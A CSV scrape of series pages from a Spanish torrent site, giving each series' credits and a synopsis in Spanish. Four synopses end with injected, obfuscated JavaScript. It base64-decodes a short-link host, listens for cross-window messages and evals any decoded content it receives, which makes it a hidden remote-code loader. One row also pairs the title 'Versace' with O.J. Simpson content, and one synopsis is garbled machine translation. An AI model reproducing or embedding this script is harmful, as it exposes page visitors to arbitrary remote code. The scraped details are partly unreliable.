Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/a-very-secret-service/,A Very Secret Service,"

Título original
    Au service de la France (TV Series)
Año
    2015
País
    Francia
Dirección
    Alexandre Courtès
Guion
    Jean-François Halin, Claire Lemaréchal, Jean-André Yerles
Música
    Nicolas Godin
Fotografía
    Pascal Rabaud
Reparto
    Hugo Becker, Wilfred Benaïche, Christophe Kourotchkine, Karim Barras, Bruno Paviot, Jean-Édouard Bodziak, Mathilde Warnier, Joséphine de La Baume, Marie-Julie Baup, Antoine Gouy, Julie Farenc, Xavier Aubert, Philippe Résimont, Stéphanie Fatout, Batiste Sornin, Guerassim Dichliev
Productora
    Mandarin Films / Mandarin Television
Género
    Serie de TV. Comedia | Años 60 						","
Descripcion
En 1960, el joven André Merlaux, es aceptado para formar parte del entrenamiento para ingresar al Servicio Secreto Francés. Su desempeño será vigilado por el director Moïse, mientras es asesorado por sus compañeros Moulinier (a cargo de los asuntos referentes a África), Jacquard (Argelia), y Calot (Europa del Este). Todo esto, en medio de la Guerra Fría, la descolonización de las colonias francesas, la Guerra de Independencia de Argelia, y la posición de Francia como Superpotencia en crisis.
"
https://www.subtorrents1.com/series/a-gifted-man/,A Gifted Man,"
                       Título Original: A Gifted Man
Creador: Susannah Grant
Producción Ejecutiva: Jonathan Demme, Susannah Grant, Sarah Timberman, Carl Beverly y Neal Baer
Estudio: CBS Television Studios
Género: Drama
Temporada: 1ª 
Episodios: 13
Fecha de estreno: 23 de septiembre de 2011
Distribución: Paramount
Horario de emisión: Viernes 8.00 p.m.


Reparto:
Patrick Wilson ... Michael Holt
Jennifer Ehle ... Anna
Julie Benz ... Christina
Liam Aiken ... Milo
Margo Martindale ... Rita
Pablo Schreiber ... Anton
Rachelle Lefevre ... Kate
Afton Williamson ... Autunm
","
Descripcion
A Gifted Man es un drama que nos presenta una brillante historia de como un materialista punto de vida sobre la vida, cambia con la llegada de una ilusión idealista. Michael es un exitoso y carismático cirujano que vive una lujosa vida llena de placeres materialistas, gracias a sus ricos y poderosos pacientes. Su percepción cambia por completo cuando su idealista ex-esposa, ya fallecida, vuelve a entrar en su vida como una ilusión, enseñándole el significado de la vida desde el más allá y le pide que mantenga abierta su clínica para gente desfavorecida. Es una historia sobre la vida, la muerte y el significado de ambas. Él no puede salvar su vida, pero ella sí podrá salvar su alma.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/a-young-doctors-notebook-miniserie/,A Young Doctor's Notebook (Miniserie),"
                       TÍTULO ORIGINAL. A Young Doctor's Notebook
AÑO: 2013
PAÍS. Reino Unido
DIRECTOR: Alex Hardcastle
GUIÓN. Mikhail A. Bulgakov
FOTOGRAFÍA. Simon Vickery
GÉNERO. Drama | Miniserie de TV
Capítulos: 4

REPARTO. Jon Hamm, Daniel Radcliffe
PRODUCTORA. Big Talk Productions
","
Descripcion
Basada en los relatos de semi-autobiográficos del escritor ruso Mijail Bulgakov, la miniserie se centra en un médico después de la Primera Guerra Mundial, inspirado por el propio  Bulgakov, trabajando como médico en una pequeña aldea rusa. El protagonista tendrá dificultades para hacer frente tanto a sus pacientes como a sus propios demonios internos, y su yo joven contemporáneo frecuentemente conversa con su yo mayor.
La miniserie está dividida en cuatro partes y está dirigida por Alex Hardcastle. Se estrenó el 06 de diciembre en el canal británico Arts Sky y será distribuida internacionalmente por BBC Worldwide.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/3/,3 %,"
                       Título original: 3%
Año: 2016
País: Brasil
Director: Jotagá Crema, Daina Giannecchini, Dani Libardi, César Charlone
Guión: Pedro Aguilera
Productora: Boutique Filmes / Netflix
Género: Ciencia ficción. Thriller

Capítulos: 8


Reparto:

João Miguel ... Ezequiel
Bianca Comparato ... Michele
Michel Gomes ... Fernando
Rodolfo Valente ... Rafael
Vaneza Oliveira ... Joana
Viviane Porto ...Aline						","
Descripcion
Ambientada en Brasil, en un futuro no muy lejano, la serie muestra una realidad completamente distinta a la que conocemos. La sociedad ha ido evolucionando hasta que al final ha quedado dividida entre la tecnología y la devastación. Sus ciudadanos se ven obligados a luchar para formar parte del lado de los privilegiados y evitar, de esta forma, caer en la devastación. Así, son sometidos a un duro y despiadado proceso en el que tendrán que competir entre sí para lograr ser los mejores y poder escapar de su miserable vida. ¿El problema? Solo el 3% de la población lo consigue.
"
https://www.subtorrents1.com/series/a-series-of-unfortunate-events/,A Series of Unfortunate Events,"
                       Título original: A Series of Unfortunate Events
Año: 2017
Duración: 50 min.
País: Estados Unidos
Director: Barry Sonnenfeld, Mark Palansky, Bo Welch
Guión: Mark Hudis (Libro: Daniel Handler)
Música: James Newton Howard
Fotografía: Bernard Couture
Productora: Netflix / Paramount Television
Género: Aventuras. Drama. Fantástico

Capítulos: 8


Reparto:

Neil Patrick Harris ... Count Olaf / Shirley / Stefano / Captain Sham
Malina Weissman ... Violet Baudelaire
Louis Hynes ... Klaus Baudelaire
Patrick Warburton ... Lemony Snicket
Joan Cusack ... Justice Strauss
Catherine O'Hara ... Georgina Orwell
Aasif Mandvi ... Oncle Monty
Don Johnson ... Sir
Alfre Woodard ... Aunt Josephine
Will Arnett 
Cobie Smulders 						","
Descripcion
La serie de Netflix sigue la historia de los hermanos Baudelaire cuyos padres han fallecido en un trágico accidente y Violet, Klaus y Sunny quedan bajo la custodia de un tío lejano, el Conde Olaf. Lo único que quiere este malvado hombre es la herencia Baudelaire y los tres niños que tiene a su cargo es lo único que se interpone entre él y el dinero familiar. Los tres pequeños tienen que adelantarse a las argucias de Olaf para desbaratar sus planes y descubrir si el incendio que mató a sus padres fue un accidente o un asesinato.
"
https://www.subtorrents1.com/series/1600-penn/,1600 Penn,"
                       TÍTULO ORIGINAL: 1600 Penn 
AÑO: 2012
PAÍS: Estados Unidos
DIRECTOR: Jason Winer
GUIÓN: Jason Winer, Josh Gad
MÚSICA: Orr Rebhun, Erica Weis
PRODUCTORA: 20th Century Fox Television
GÉNERO: Comedia | Sitcom familiar. Política 

REPARTO:
Jenna Elfman, Bill Pullman, Amara Miller, Martha MacIsaac, Josh Gad, Miguel Sandoval
","
Descripcion
Presentada como una comedia centrada sobre una familia disfuncional 1600 Penn se centra en Skip, el hijo mayor e incontrolable (Josh Gad) que vuelve a su casa donde se convierte en una persona fiable y responsable además de ser el pegamento que une a la familia. Esta familia no es cualquiera, vive en la Casa Blanca. Bill Pullman interpretará el papel del presidente Dale Gilchrist. Jenna Elfman ('Dharma y Greg', 'Casi sin querer') será la Primera Dama de los Estados Unidos, Emily Nash Gilchrist. Amara Miller (The Descendants) será Marigold, la hija más joven del presidente (Bill Pullman). Aunque en principio Brittany Snow ('Harry´s Law') debía interpretar a Becca, la mayor de las hijas del presidente que es descrita como perfeccionista, finalmente será Martha MacIsaac ('Greek') la encargada de darle vida ya que físicamente se parece más a los miembros del reparto que han de interpretar a su familia. Andre Holland ('Friends With Benefits') será Marshall Malloy, un agregado de prensa para la Casa Blanca.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/acceptable-risk/,Acceptable Risk,"
                       Título original
    Acceptable Risk 
Año
    2017
País
    Irlanda Irlanda
Dirección
    Kenneth Glenaan, Christian Langlois 
Guion
    Ron Hutchinson
Música
    Michel Corriveau
Fotografía
    Tim Fleming
Reparto
    Elaine Cassidy, Morten Suurballe, Angeline Ball, Lisa Hogg, Geordie Johnson, Paul Popowich, Risteard Cooper, Kate Moran, Rory Nolan, Gloria Cramer Curtis, Elijah O'Sullivan, Dearbhla Molloy, Catherine Walker, Karen Ardiff 
Productora
    Acorn Media Enterprises / RTÉ
Género
    Thriller | Miniserie de TV 						","
Descripcion
Sarah era una brillante abogada en una multinacional farmacéutica, puesto que abandonó voluntariamente para dedicarse a criar a sus dos hijos, pero la tragedia le persigue tras perder a su primer marido y padre de sus hijos, en un extraño accidente hace tres años, poco después que ella abandonará la empresa. Tras enderezar su situación personal con Lee, otro ejecutivo de la misma multinacional, sufre otro enorme mazazo, cuando descubren el cadáver de Lee en un barrio de mala muerte de Montreal, brutalmente asesinado en la ciudad donde se encontraba en viaje de negocios.
Sarah va descubriendo poco a poco no solo la verdad sobre su compañero Lee sino sobre la multinacional farmacéutica, lo que le obliga a emprender su cruzada personal para esclarecer todo, caiga quien caiga, con grave riesgo para ella y su familia.
"
https://www.subtorrents1.com/series/american-housewife/,American Housewife,"
                       Título original
    American Housewife (TV Series) 
Año
    2016
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Dirección
    Sarah Dunn (Creator), Ryan Case, John Fortenberry, Chris Koch, Melissa Kosar, Declan Lowney 
Guion
    Julie Bean, Sarah Dunn
Música
    Jonathan Sadoff, Orr Rebhun, Erica Weis
Fotografía
    Andrew Rawson, Damián Acevedo
Reparto
    Katy Mixon, Jeremy Howard, Carly Hughes, Mackenzie Marsh, Jeannette Sousa, Daniel DiMaggio, Julia Butters, Johnny Sequoyah 
Productora
    3 Hounds Productions / ABC Studios / Eight Sisters Productions
Género
    Serie de TV. Comedia 						","
Descripcion
Serie de TV (2016-). 2 temporadas. 25 episodios. Katie Otto, es una mujer normal y madre de familia que intenta sobresalir entre las amas de casa en su ciudad natal de Westport, Connecticut. Vive con Greg, su sensato marido y profesor universitario; Taylor, su atlética hija mayor que quiere integrarse con sus compañeros; Oliver, su segundo hijo financieramente inteligente; y Anna-Kat, su dulce pero obsesiva-compulsiva hija menor.
"
https://www.subtorrents1.com/series/arthdal-chronicles/,Arthdal Chronicles,"
                       Titulo Original: Arthdal Chronicles 
Titulo Español: Arthdal Chronicles 
Año: 2019 
Genero: Drama, Fantasia 
Promedio De Duracion: 50 Minutos 
Pais: Corea del Sur
Clasificacion: Mayores de 12 Años 						","
Descripcion
En la tierra mítica llamada Arth, los habitantes de la legionaria ciudad Arthdal y regiones de los alrededores buscan el poder mientras forman una nueva sociedad. Eun Som es un niño de Blue Stone Village que nace maldecido bajo una señal de mal agüero. Años más tarde, se convertirá en el conquistador de Asadal, convirtiéndolo en un imperio. Ta Gon, un ambicioso y estratégico héroe de guerra, planea convertirse en el primer Rey de Asadal. Eu Som se enamora de Tan Ya, una mujer que, como él, fue maldecida en su nacimiento y, a pesar de todo, se convierte en la primera política femenina de Asadal.
"
https://www.subtorrents1.com/series/american-crime-story-the-people-v-o-j-simpson/,American Crime Story: Versace,"
                       Título original: American Crime Story: The People v. O.J. Simpson
Año: 2016
País: Estados Unidos
Director: Ryan Murphy (Creator)
Guión: Ryan Murphy, Scott Alexander, Larry Karaszewski, Jeffrey Toobin
Productora: 20th Century Fox Television / Ryan Murphy Productions / Color Force
Género: Intriga | Crimen. Biográfico

Capítulos: 10


Reparto:

Cuba Gooding Jr. ... O.J. Simpson
David Schwimmer ... Robert Kardashian
Sarah Paulson ... Marcia Clark
John Travolta ... Robert Shapiro
Courtney B. Vance ... Johnny Cochran
Sterling K. Brown ... Christopher Darden
Kenneth Choi ... Judge Ito
Bruce Greenwood ... Gil Garcetti
Gbenga Akinnagbe ... Dennis Schatzman
Rob Morrow ... Barry Scheck
Nathan Lane ... F. Lee Bailey						","
Descripcion
American Crime Story contará cada temporada una historia sobre algunos de los crímenes más conocidos de la historia de Estados Unidos.
La primera tanda de capítulos, American Crime Story: The People Vs O J Simpson, estará basada en el libro de Jeffrey Toobin The Run of His Life: The People V. O.J. Simpson y tendrá como eje central el controvertido caso del deportista O.J. Simpson, quien, a pesar de las pruebas que lo incriminaban en un doble homicidio, fue declarado inocente por el jurado popular. Contará el proceso judicial desde la perspectiva del abogado de Simpson y mostrará todas las maniobras y estrategias utilizadas por ambas partes para conseguir sus objetivos.
Nueva producción de Ryan Murphy, tras el éxito de la saga American Horror Story, para FX.
"
https://www.subtorrents1.com/series/akta-manniskor/,Äkta Människor,"
                       Titulo de la serie original: Äkta Människor
Titulo de la serie en inglés: Real Humans
Director: Levan Akin
Writer: Lars Lundström
Year: 2012
Genres: Drama | Sci-Fi 
Country: Sweden
Language: Swedish
Production Co: Matador Film AB, Sveriges Television (SVT) 

Temporada: 1
Capítulos: 10

Temporada: 2
Capítulos: 10

Stars:
Andreas Wilson, Lisette Pagler and Pia Halvorsen 						","
Descripcion
En un presente paralelo, la humana artificial ha entrado en su cuenta. Los robots ya no tienen nada como un robot sobre ellos. Las nuevas tecnologías y avances en el campo de la ciencia han hecho posible la fabricación de un producto – una especie de siervo mecanizada – que es tan similar a un ser humano real que puede ser considerado un sustituto perfecto estado. El Robot Humano (HUBOT) también han dado lugar a nuevos problemas y dilemas. Espinosas cuestiones jurídicas cada vez más comenzaron a ocupar las mentes de la gente y todavía están a la espera de ser contestada: ¿Quién es responsable de las acciones de un hubot? ¿Es hubots tienen algún tipo de ""derechos"" hubot? En caso de que se paga por su trabajo? Como un número cada vez mayor de personas que establecen relaciones con hubots, los límites entre el hombre y la máquina se confunden. Cuando los seres humanos hacen copias de sí mismos, que son tan cercanos a la realidad que establecer vínculos emocionales, las preguntas que se plantea – ¿Qué es lo que realmente significa ser ""humano""? (Traductor google)(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
